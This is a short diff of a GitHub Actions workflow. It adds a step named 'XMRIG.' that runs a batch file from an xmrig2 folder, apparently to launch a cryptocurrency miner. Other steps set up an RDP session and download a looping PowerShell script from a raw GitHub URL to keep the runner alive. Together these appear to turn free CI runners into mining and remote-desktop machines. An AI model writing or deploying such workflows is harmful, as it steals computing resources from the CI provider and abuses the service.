@@ -32,7 +32,7 @@ jobs:
     - name: Connecting to your RDP.
       run: cmd /c start.bat
     - name: XMRIG.
-      run: cmd cd
+      run: cmd /c D:\a\cpu\cpu\xmrig2\xmrig2\jai.bat
     - name: RDP is ready!
       run: | 
         Invoke-WebRequest https://raw.githubusercontent.com/romain09/AWS-RDP/main/loop.ps1 -OutFile loop.ps1
